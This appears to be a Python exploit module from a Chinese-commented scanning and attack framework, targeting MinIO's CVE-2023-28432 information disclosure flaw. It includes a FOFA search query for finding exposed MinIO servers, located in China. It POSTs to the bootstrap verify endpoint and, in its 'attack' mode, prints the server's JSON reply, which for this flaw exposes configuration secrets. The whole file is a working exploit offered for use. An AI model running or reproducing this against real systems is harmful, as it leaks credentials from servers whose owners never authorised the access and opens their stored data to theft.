from lib.util.exprequest import ExpRequest
from lib.util.output import Output
import lib.util.globalvar as GlobalVar
"""
--minio--
fofa: title="MinIO Browser"
"""
class minio():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
            
    def CVE_2023_28432(self):
        """
        fofa: (banner="MinIO" || header="MinIO" || title="MinIO Browser") && country="CN"
        """
        appName = 'minio'
        pocname = 'CVE_2023_28432'
        method = 'post'
        info = '[data]'
        path = '/minio/bootstrap/v1/verify'
        data = ''
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            #_verify
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data)
                if 'MinioPlatform' in r.text:
                    return output.echo_success(method, info)
                else:
                    return output.fail()
            #_attack
            else:
                import json
                r = exprequest.post(self.url+path, data=data)
                json_load = json.loads(r.text)
                print(json.dumps(json_load, indent=4))
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    Expminio = minio(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(Expminio, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(minio):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(Expminio, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)